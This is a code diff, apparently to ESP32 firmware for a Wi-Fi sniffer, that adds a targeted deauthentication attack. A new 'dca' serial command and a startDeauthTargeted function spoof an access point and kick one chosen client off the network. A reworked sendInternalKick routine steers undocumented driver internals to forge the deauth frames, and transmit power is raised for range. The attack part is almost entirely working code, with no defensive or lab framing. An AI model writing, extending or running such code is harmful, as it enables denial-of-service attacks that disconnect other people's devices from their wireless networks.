@@ -214,6 +214,7 @@ bool deauthParked = false;      // like huntParked: we hold the park on the targ
 volatile uint32_t deauthSent = 0, deauthTxFail = 0;
 uint32_t deauthStartMs = 0;     // millis() when the current attack started; serviceDeauth enforces kDeauthMaxMs
 bool deauthDumped = false;      // DIAGNOSTIC: dump the built frame once per attack
+uint8_t deauthTargetMac[6] = {0};  // for targeted deauth (dca command); empty/broadcast = kick all clients of BSSID
 
 // DIAGNOSTIC: beacon-injection self-test (see sendTestBeacon below), toggled with "txtest 1".
 volatile bool txTestActive = false;
@@ -1469,12 +1470,21 @@ void printHunt() {
 }
 
 // [bssid, park channel (0 if hopping), frames sent, frames failed]
+// In targeted mode: ["client_mac","ap_bssid",targeted_flag,sent,fail]
+// In broadcast mode: ["bssid",ch,sent,fail]
 void printDeauth() {
     if (!deauthActive) { Serial.print("\"deauth\":null"); return; }
-    char mac[26];
-    fmtMac(mac, sizeof(mac), deauthBssid);
-    Serial.printf("\"deauth\":[\"%s\",%d,%lu,%lu]", mac, parkedIdx >= 0 ? kChannels[parkedIdx] : 0,
-                  static_cast<unsigned long>(deauthSent), static_cast<unsigned long>(deauthTxFail));
+    char mac[26], ap[26];
+    bool targeted = (deauthTargetMac[0] || deauthTargetMac[1]);
+    fmtMac(mac, sizeof(mac), targeted ? deauthTargetMac : deauthBssid);
+    if (targeted) {
+        fmtMac(ap, sizeof(ap), deauthBssid);
+        Serial.printf("\"deauth\":[\"%s\",\"%s\",1,%lu,%lu]", mac, ap, 
+                      static_cast<unsigned long>(deauthSent), static_cast<unsigned long>(deauthTxFail));
+    } else {
+        Serial.printf("\"deauth\":[\"%s\",%d,%lu,%lu]", mac, parkedIdx >= 0 ? kChannels[parkedIdx] : 0,
+                      static_cast<unsigned long>(deauthSent), static_cast<unsigned long>(deauthTxFail));
+    }
 }
 
 void sendHello() {
@@ -1984,18 +1994,17 @@ void stopHunt() {
     if (currentPage == PAGE_HUNT) showPage(hopMode() ? PAGE_OVERVIEW : PAGE_DEVICES);
 }
 
-// Park on the AP's last-seen channel when we know it, so the frames actually land.
+// Deauth: kick all clients of an AP (broadcast mode). 
+// The MAC you provide is treated as the AP's BSSID; broadcast deauth frames are sent.
 void startDeauth(const uint8_t* mac) {
     portENTER_CRITICAL(&g_devMux);
     memcpy(deauthBssid, mac, 6);
-    int ch = 0;
-    for (int i = 0; i < kWifiDevSlots; i++) if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, mac)) { ch = wifiDevs[i].ch; break; }
+    // Clear any previous targeted mode
+    memset(deauthTargetMac, 0, 6);
     deauthSent = 0;
     deauthTxFail = 0;
     deauthStartMs = millis();
     deauthDumped = false;
-    // Note: the driver reads *adjacent* BSS words (&g_ic+16 / &g_ic+20 hold the STA/AP hmac pointers),
-    // not fields of the ic struct itself. Panic inside send_setup if the word is 0, so fall back to AP.
     uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);   // STA hmac (panic if 0)
     if (!slotWord) slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);   // fall back to AP
     memcpy(deauthSlotPad, &slotWord, 4);
@@ -2005,6 +2014,43 @@ void startDeauth(const uint8_t* mac) {
     (void)esp_wifi_set_max_tx_power(160);   // 16 dBm for the attack (startWifi's 8.2 dBm is tuned for quiet sniffing, not for range)
     if (deauthParked) setPark(-1);                    // restart of a running attack: re-park below
     deauthParked = false;
+    // Find channel for this BSSID/AP
+    int ch = 0;
+    for (int i = 0; i < kWifiDevSlots; i++) {
+        if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, deauthBssid)) { 
+            ch = wifiDevs[i].ch; 
+            break;
+        }
+    }
+    if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauthParked = true; } }
+}
+
+// Targeted deauth: explicitly target one specific client station by providing both its MAC and the AP's BSSID.
+void startDeauthTargeted(const uint8_t* clientMac, const uint8_t* apBssid) {
+    portENTER_CRITICAL(&g_devMux);
+    memcpy(deauthBssid, apBssid, 6);
+    memcpy(deauthTargetMac, clientMac, 6);
+    deauthSent = 0;
+    deauthTxFail = 0;
+    deauthStartMs = millis();
+    deauthDumped = false;
+    uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);
+    if (!slotWord) slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);
+    memcpy(deauthSlotPad, &slotWord, 4);
+    deauthHstate = *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312);
+    deauthActive = true;
+    portEXIT_CRITICAL(&g_devMux);
+    (void)esp_wifi_set_max_tx_power(160);
+    if (deauthParked) setPark(-1);
+    deauthParked = false;
+    // Find channel for the AP
+    int ch = 0;
+    for (int i = 0; i < kWifiDevSlots; i++) {
+        if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, apBssid)) { 
+            ch = wifiDevs[i].ch; 
+            break;
+        }
+    }
     if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauthParked = true; } }
 }
 
@@ -2020,7 +2066,8 @@ void stopDeauth() {
 
 void handleCommand(char* line) {
     // Commands: "cap 0|1", "snap N", "park <ch>|0", "band 5g|2.4g|both|ble", "hunt <mac> [ch]" | "hunt 0",
-    //           "deauth <bssid>" | "deauth 0" (Wi-Fi modes only), "info"
+    //           "deauth <bssid>" | "deauth 0" (Wi-Fi modes only, broadcast deauth to all clients of AP),
+    //           "dca <client_mac> <ap_bssid>" (targeted deauth to one station) | "dca 0", "info"
     char* sp = strchr(line, ' ');
     char* arg = const_cast<char*>("");
     if (sp) { *sp = 0; arg = sp + 1; }
@@ -2132,6 +2179,32 @@ void handleCommand(char* line) {
             Serial.printf("{\"t\":\"ack\",\"cmd\":\"deauth\",\"deauth\":null,\"park\":%d}\n", ch);
         if (deauthActive && serialRoom(140))   // DIAGNOSTIC: hmac slot used by the internal path + its state byte (picks the DA/SA mapping)
             Serial.printf("{\"t\":\"log\",\"msg\":\"deauth slot %lx hstate %d\"}\n", *(const uint32_t*)deauthSlotPad, deauthHstate);
+    } else if (!strcmp(line, "dca")) {  // dca <client_mac> <ap_bssid>: targeted deauth to one specific station
+        char* arg2 = strchr(arg, ' ');
+        if (wifiMode() && arg2) {
+            uint8_t clientMac[6], apBssid[6];
+            *arg2 = 0;
+            bool ok1 = parseMac(arg, clientMac);
+            bool ok2 = parseMac(arg2 + 1, apBssid);
+            if (ok1 && ok2) {
+                startDeauthTargeted(clientMac, apBssid);
+            } else {
+                stopDeauth();
+            }
+        } else {
+            stopDeauth();
+        }
+        char c[26], a[26];
+        fmtMac(c, sizeof(c), deauthTargetMac[0] || deauthTargetMac[1] ? deauthTargetMac : deauthBssid);
+        fmtMac(a, sizeof(a), deauthBssid);
+        const int ch = parkedIdx >= 0 ? kChannels[parkedIdx] : 0;
+        if (deauthActive) {
+            bool targeted = (deauthTargetMac[0] || deauthTargetMac[1]);
+            Serial.printf("{\"t\":\"ack\",\"cmd\":\"dca\",\"deauth\":[\"%s\",\"%s\",%d,0,0],\"park\":%d}\n", 
+                          c, a, targeted ? 1 : 0, ch);
+        } else {
+            Serial.printf("{\"t\":\"ack\",\"cmd\":\"dca\",\"deauth\":null,\"park\":%d}\n", ch);
+        }
     } else if (!strcmp(line, "txtest")) {
         // 0 = off, 1 = beacon with promiscuous RX still on, 2 = beacon with promiscuous RX turned off.
         // Mode 2 tests whether promiscuous mode is what stops the PHY from transmitting.
@@ -2317,10 +2390,8 @@ extern "C" int chm_is_at_home_channel(void);   // ROM fn, no args: 1 = radio on 
 
 // Drive the driver's own deauth frame construction (same helpers an AP uses to kick a station), so the
 // bytes are exactly what this chip family emits. The driver writes FC=[0xC0,x] plus duration/seq; we steer
-// the three address slots so DA=broadcast and SA=BSSID=the AP in every send_setup branch
-// (hstate 0 puts A6→DA, hstates 1/3 put A4/A6→SA/BSSID):
-//   hstate==0: A4=AP(SA)  A5=bcast(BSSID-ish) A6=bcast(DA)
-//   else:      A4=A6=AP   A5=bcast(DA)
+// the three address slots. In broadcast mode, DA=broadcast and SA=BSSID=the AP.
+// In targeted mode (deauthTargetMac set), DA=the specific client MAC, SA/BSSID=the AP.
 void sendInternalKick() {
     static const uint8_t kBcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     void* desc = ieee80211_alloc_deauth(deauthSlotPad, kBcastMac, 7);   // arg1 likely unused; reason 7 lands at D+24
@@ -2340,10 +2411,11 @@ void sendInternalKick() {
         v |= 0x1C000u;   // build 8: (param+len)<<16 with len 26, so the reason code fits on air after ppTxPkt's +8 shift
         *ebw = v;
     }
+    const uint8_t* daMac = (deauthTargetMac[0] || deauthTargetMac[1]) ? deauthTargetMac : kBcastMac;  // targeted or broadcast
     ieee80211_send_setup(deauthSlotPad, desc, 192, 16,
-                         deauthBssid,                                     // A4 → SA in every branch (the AP we spoof)
-                         kBcastMac,                                       // A5 → DA (hstates 1/3) / BSSID slot (hstate 0)
-                         deauthHstate == 0 ? kBcastMac : deauthBssid);   // A6 → DA (hstate 0) / SA+BSSID (hstates 1/3)
+                         deauthBssid,                                     // A4 → SA (the AP we spoof)
+                         daMac,                                           // A5 → DA (hstates 1/3) / BSSID slot (hstate 0)
+                         deauthHstate == 0 ? daMac : deauthBssid);       // A6 → DA (hstate 0) / SA+BSSID (hstates 1/3)
     ieee80211_set_tx_desc(deauthSlotPad, desc, 7, 16, 0);
     const uint32_t d56 = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 56);
     if (d56) {
@@ -2354,7 +2426,9 @@ void sendInternalKick() {
     uint8_t* D = reinterpret_cast<uint8_t*>(*reinterpret_cast<volatile uint32_t*>(P + 4));
     if (D) {
         const size_t off = (*reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40) & 2u) ? 8 : 0;
-        if (deauthHstate == 0)   // hstate-0 branch puts broadcast in the BSSID slot → patch so SA==BSSID like a real AP kick
+        // hstate-0 branch puts broadcast/DA in the BSSID slot → patch so SA==BSSID like a real AP kick.
+        // In targeted mode, DA is already set to deauthTargetMac via send_setup's A6 argument above.
+        if (deauthHstate == 0)
             memcpy(D + 16 + off, deauthBssid, 6);
         // FC must stay a *deauthentication*: type 0 (management), subtype 12 -> byte0 0xC0, and management
         // frames carry no ToDS/FromDS, so byte1 is 0x00. (A previous build wrote [C8 02] here, which is
